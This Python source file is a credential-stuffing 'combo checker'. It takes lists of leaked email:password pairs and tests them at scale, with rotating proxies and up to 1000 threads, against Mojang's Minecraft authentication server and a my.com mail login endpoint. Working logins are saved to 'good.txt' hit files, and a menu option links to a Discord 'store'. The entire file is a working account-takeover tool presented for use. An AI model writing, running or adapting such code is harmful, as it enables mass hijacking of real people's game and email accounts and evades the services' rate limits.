# © Design is Copyright by EclipsesDev
# Beautiful Designed Minecraft Account Checker

import os
import sys
import time
import random
import json
import hashlib
import threading
import webbrowser
from datetime import datetime
from pathlib import Path

import requests
from colorama import Fore, init

try:
    import tkinter
    from tkinter import filedialog
except Exception:
    tkinter = None

if os.name == "nt":
    try:
        import ctypes
    except Exception:
        ctypes = None
else:
    ctypes = None

init(autoreset=True)

RESULTS_DIR = Path("results")
MAIL_DIR = RESULTS_DIR / "mail_access"
MC_DIR = RESULTS_DIR / "minecraft"
CURRENT_DATE = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
AUTHOR = "EclipsesDev © 2022-2026"
MESSAGES = ["Designed to look like premium Checker :D"]

RESULTS_DIR.mkdir(parents=True, exist_ok=True)
MAIL_DIR.mkdir(parents=True, exist_ok=True)
MC_DIR.mkdir(parents=True, exist_ok=True)
(MAIL_DIR / CURRENT_DATE).mkdir(parents=True, exist_ok=True)
(MC_DIR / CURRENT_DATE).mkdir(parents=True, exist_ok=True)

COUNTERS_LOCK = threading.Lock()
GOOD = 0
BAD = 0
BANNED = 0
ERRORS = 0
CHECKED = 0
CPM_CURRENT = 0
CPM_LAST = 0

LOGO = f"""
 {Fore.GREEN} █████╗ █████╗ ███╗   ███╗██████╗  ╔█████╗    █████╗ ██╗  ██╗███████╗ █████╗ ██╗  ██╗███████╗██████╗ {Fore.CYAN}
 {Fore.GREEN}██╔══██╗██╔══██╗████╗ ████║██╔══██╗██╔══██╗  ██╔══██╗██║  ██║██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗{Fore.CYAN} 
 {Fore.GREEN}██║  ╚═╝██║  ██║██║╚██╔╝██║██████╦╝██║  ██║  ██║  ╚═╝███████║█████╗  ██║  ╚═╝█████═╝ █████╗  ██████╔╝{Fore.CYAN}
 {Fore.GREEN}██║  ██╗██║  ██║██║ ╚██╔╝██║██╔══██╗██║  ██║  ██║  ██╗██╔══██║██╔══╝  ██║  ██╗██╔═██╗ ██╔══╝  ██╔══██╗{Fore.CYAN}
 {Fore.GREEN}╚█████╔╝╚█████╔╝██║  ╚═╝ ██║██████╦╝╚█████╔╝  ╚█████╔╝██║  ██║███████╗╚█████╔╝██║ ╚██╗███████╗██║  ██║{Fore.CYAN}
 {Fore.GREEN} ╚════╝  ╚════╝ ╚═╝     ╚═╝╚═════╝  ╚════╝    ╚════╝ ╚═╝  ╚═╝╚══════╝ ╚════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{Fore.CYAN}
                                                                                                             """


def clear_console():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


def set_console_title(text: str):
    if ctypes is not None:
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(text)
        except Exception:
            pass
    elif sys.stdout.isatty():
        sys.stdout.write(f"\x1b]2;{text}\x07")
        sys.stdout.flush()


def choose_file(prompt: str, title: str = "Choose a file") -> Path | None:
    if tkinter and getattr(tkinter, "Tk", None):
        try:
            root = tkinter.Tk()
            root.withdraw()
            path = filedialog.askopenfilename(title=title, filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
            root.destroy()
            if path:
                return Path(path)
        except Exception:
            pass

    print(prompt)
    path_value = input("  Enter file path: ").strip()
    if not path_value:
        return None
    return Path(path_value)


def normalize_proxy(proxy_line: str) -> str | None:
    proxy_line = proxy_line.strip()
    if not proxy_line:
        return None
    if proxy_line.startswith(("http://", "https://", "socks4://", "socks5://")):
        return proxy_line
    parts = proxy_line.split(":")
    if len(parts) == 2:
        return proxy_line
    if len(parts) == 4:
        host, port, user, pwd = parts
        return f"{user}:{pwd}@{host}:{port}"
    return None


def build_proxy_settings(proxy_line: str, proxy_type: str) -> dict[str, str] | None:
    proxy_line = normalize_proxy(proxy_line)
    if not proxy_line:
        return None

    if proxy_line.startswith(("http://", "https://", "socks4://", "socks5://")):
        proxy_url = proxy_line
    else:
        proxy_url = f"{proxy_type}://{proxy_line}"

    return {"http": proxy_url, "https": proxy_url}


def load_combos() -> list[tuple[str, str]]:
    clear_console()
    set_console_title(f"Combo Checker - By {AUTHOR}")
    print("\n" + LOGO + "\n")
    print(f"  Designed by {AUTHOR} \"{random.choice(MESSAGES)}\"")
    print()
    print("  Press ENTER to select combos or enter a path manually.")
    path = choose_file("Select your combo file.", "Choose a combo file")
    if not path or not path.exists():
        print("  Please select a valid combo file.")
        time.sleep(2)
        return []

    combos: list[tuple[str, str]] = []
    with path.open("r", encoding="utf-8", errors="ignore") as handle:
        for line in handle:
            line = line.strip()
            if not line or ":" not in line:
                continue
            email, password = line.split(":", 1)
            combos.append((email.strip(), password.strip()))

    print(f"  Loaded [{len(combos)}] combo lines.")
    time.sleep(1.5)
    return combos


def load_proxies() -> list[str]:
    clear_console()
    set_console_title(f"Combo Checker - By {AUTHOR}")
    print("\n" + LOGO + "\n")
    print(f"  Designed by {AUTHOR} \"{random.choice(MESSAGES)}\"")
    print()
    print("  Press ENTER to select proxies or enter a path manually.")
    path = choose_file("Select your proxy file.", "Choose a proxy file")
    if not path or not path.exists():
        print("  Please select a valid proxy file.")
        time.sleep(2)
        return []

    proxy_list: list[str] = []
    with path.open("r", encoding="utf-8", errors="ignore") as handle:
        for line in handle:
            proxy = normalize_proxy(line)
            if proxy:
                proxy_list.append(proxy)

    print(f"  Loaded [{len(proxy_list)}] proxies.")
    time.sleep(1.5)
    return proxy_list


def update_counters(status_name: str, output_path: Path, email: str, password: str) -> None:
    output_path.parent.mkdir(parents=True, exist_ok=True)
    with output_path.open("a", encoding="utf-8") as handle:
        handle.write(f"{email}:{password}\n")


def check_mail(email: str, password: str, proxy_list: list[str], proxy_type: str) -> None:
    global GOOD, BAD, BANNED, ERRORS, CHECKED, CPM_CURRENT
    try:
        session = requests.Session()
        if proxy_list:
            proxy_line = random.choice(proxy_list)
            proxies = build_proxy_settings(proxy_line, proxy_type)
            if proxies:
                session.proxies.update(proxies)

        url = f"https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login={email}&Password={password}"
        headers = {"User-Agent": "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0"}
        response = session.get(url, headers=headers, timeout=20)
        text = response.text

        with COUNTERS_LOCK:
            if "Ok=1" in text:
                GOOD += 1
                update_counters("good", MAIL_DIR / CURRENT_DATE / "good.txt", email, password)
            elif "Ok=0" in text:
                BAD += 1
                update_counters("bad", MAIL_DIR / CURRENT_DATE / "bad.txt", email, password)
            else:
                BANNED += 1
                update_counters("banned", MAIL_DIR / CURRENT_DATE / "banned.txt", email, password)
            CHECKED += 1
            CPM_CURRENT += 1
    except Exception:
        with COUNTERS_LOCK:
            ERRORS += 1


def check_minecraft(email: str, password: str, proxy_list: list[str], proxy_type: str) -> None:
    global GOOD, BAD, BANNED, ERRORS, CHECKED, CPM_CURRENT
    try:
        session = requests.Session()
        if proxy_list:
            proxy_line = random.choice(proxy_list)
            proxies = build_proxy_settings(proxy_line, proxy_type)
            if proxies:
                session.proxies.update(proxies)

        url = "https://api.mojang.com/profiles/minecraft"
        payload = json.dumps([email])
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Pragma": "no-cache",
            "Accept": "*/*",
        }
        response = session.post(url, data=payload, headers=headers, timeout=20)
        text = response.text

        with COUNTERS_LOCK:
            if "legacy\":true" in text:
                token_value = hashlib.md5(email.encode("utf-8")).hexdigest()
                auth_url = "https://authserver.mojang.com/authenticate"
                auth_payload = {
                    "agent": {"name": "Minecraft", "version": 1},
                    "clientToken": token_value,
                    "password": password,
                    "requestUser": True,
                    "username": email,
                }
                auth_headers = {
                    "Content-Type": "application/json",
                    "User-Agent": "MinecraftLauncher/1.0",
                    "Pragma": "no-cache",
                    "Accept": "*/*",
                }
                auth_response = session.post(auth_url, json=auth_payload, headers=auth_headers, timeout=20)
                auth_text = auth_response.text
                if "Invalid credentials" in auth_text:
                    BAD += 1
                    update_counters("bad", MC_DIR / CURRENT_DATE / "bad.txt", email, password)
                elif "accessToken" in auth_text or "passwordChangedAt" in auth_text:
                    GOOD += 1
                    update_counters("good", MC_DIR / CURRENT_DATE / "good.txt", email, password)
                else:
                    BANNED += 1
                    update_counters("banned", MC_DIR / CURRENT_DATE / "banned.txt", email, password)
            elif response.status_code == 429 or "The client has sent too many requests within a certain amount of time" in text:
                BANNED += 1
                update_counters("banned", MC_DIR / CURRENT_DATE / "banned.txt", email, password)
            else:
                BAD += 1
                update_counters("bad", MC_DIR / CURRENT_DATE / "bad.txt", email, password)

            CHECKED += 1
            CPM_CURRENT += 1
    except Exception:
        with COUNTERS_LOCK:
            ERRORS += 1


def print_banner(title: str) -> None:
    clear_console()
    set_console_title(f"{title} - By {AUTHOR}")
    print("\n" + LOGO + "\n")
    print(f"  Designed by {AUTHOR} \"{random.choice(MESSAGES)}\"")
    print()


def run_screen_updater(total: int, section: str, stop_event: threading.Event) -> None:
    global CPM_CURRENT, CPM_LAST
    while stop_event.is_set():
        time.sleep(1)
        with COUNTERS_LOCK:
            CPM_LAST = CPM_CURRENT
            CPM_CURRENT = 0
            checked = CHECKED
            good = GOOD
            bad = BAD
            banned = BANNED
            errors = ERRORS

        print_banner(section)
        print(f"  Running {section} Checker")
        print()
        print(Fore.LIGHTYELLOW_EX + f"  Checked: [{checked}/{total}]")
        print(Fore.GREEN + f"  Hits: [{good}]")
        print(Fore.RED + f"  Bad: [{bad}]")
        print(Fore.LIGHTRED_EX + f"  Banned: [{banned}]")
        print(Fore.LIGHTBLUE_EX + f"  Cpm: [{CPM_LAST * 60}]")
        print(Fore.RED + f"  Errors: [{errors}]")


def run_checker(
    combos: list[tuple[str, str]],
    proxy_list: list[str],
    proxy_type: str,
    max_threads: int,
    check_function,
    section: str,
) -> None:
    if not combos:
        print("  No combos loaded.")
        time.sleep(2)
        return

    if not proxy_list:
        print("  No proxies loaded.")
        time.sleep(2)
        return

    stop_event = threading.Event()
    stop_event.set()
    screen_thread = threading.Thread(target=run_screen_updater, args=(len(combos), section, stop_event), daemon=True)
    screen_thread.start()

    semaphore = threading.Semaphore(max_threads)
    workers: list[threading.Thread] = []

    def worker(email: str, password: str) -> None:
        try:
            check_function(email, password, proxy_list, proxy_type)
        finally:
            semaphore.release()

    for email, password in combos:
        semaphore.acquire()
        t = threading.Thread(target=worker, args=(email, password), daemon=True)
        t.start()
        workers.append(t)

    for worker_thread in workers:
        worker_thread.join()

    stop_event.clear()
    time.sleep(0.2)
    print_banner(section)
    with COUNTERS_LOCK:
        print(Fore.GREEN + f"  Completed: {CHECKED} checked, {GOOD} hits, {BAD} bad, {BANNED} banned, {ERRORS} errors")
    input("\n  Press ENTER to return to the menu.")


def select_proxy_type() -> str | None:
    print("  What type of proxies do you want to use?")
    print("\n  [1] http/s\n  [2] socks4\n  [3] socks5")
    choice = input("  ").strip()
    return {"1": "https", "2": "socks4", "3": "socks5"}.get(choice)


def ask_for_threads() -> int:
    print("  How many threads do you want to use? [Max 1000]")
    try:
        value = int(input("  ").strip())
    except ValueError:
        return 0
    return min(max(value, 1), 1000)


def start_mail() -> None:
    global GOOD, BAD, BANNED, ERRORS, CHECKED, CPM_CURRENT, CPM_LAST
    GOOD = BAD = BANNED = ERRORS = CHECKED = CPM_CURRENT = CPM_LAST = 0

    combos = load_combos()
    if not combos:
        return

    proxy_type = select_proxy_type()
    if not proxy_type:
        print("  Invalid proxy type.")
        time.sleep(2)
        return

    proxies = load_proxies()
    if not proxies:
        return

    threads = ask_for_threads()
    if threads <= 0:
        print("  Invalid thread value.")
        time.sleep(2)
        return

    print_banner("Mail Access")
    time.sleep(1.5)
    run_checker(combos, proxies, proxy_type, threads, check_mail, "Mail Access")


def start_mc() -> None:
    global GOOD, BAD, BANNED, ERRORS, CHECKED, CPM_CURRENT, CPM_LAST
    GOOD = BAD = BANNED = ERRORS = CHECKED = CPM_CURRENT = CPM_LAST = 0

    combos = load_combos()
    if not combos:
        return

    proxy_type = select_proxy_type()
    if not proxy_type:
        print("  Invalid proxy type.")
        time.sleep(2)
        return

    proxies = load_proxies()
    if not proxies:
        return

    threads = ask_for_threads()
    if threads <= 0:
        print("  Invalid thread value.")
        time.sleep(2)
        return

    print_banner("Minecraft")
    time.sleep(1.5)
    run_checker(combos, proxies, proxy_type, threads, check_minecraft, "Minecraft")


def main() -> None:
    while True:
        print_banner("Combo Checker")
        print(Fore.RED + "  Pick option [1], [2], [3], [4], [5]" + Fore.LIGHTGREEN_EX)
        print("\n  [1] Minecraft Checker\n  [2] Mail Access Checker\n  [3] Discord Store\n  [4] Credits\n  [5] Quit")
        choice = input("  ").strip()

        if choice == "1":
            start_mc()
        elif choice == "2":
            start_mail()
        elif choice == "3":
            webbrowser.open_new("https://discord.gg/dre2PD23Qd")
        elif choice == "4":
            print_banner("Credits")
            print(f"  [+] Developed by Unknown\n  [+] Designed by {AUTHOR}")
            input("\n  Press ENTER to return to the menu.")
        elif choice == "5":
            print("  Closing...")
            time.sleep(1)
            sys.exit(0)
        else:
            print("  Invalid input.")
            time.sleep(1)


if __name__ == "__main__":
    main()
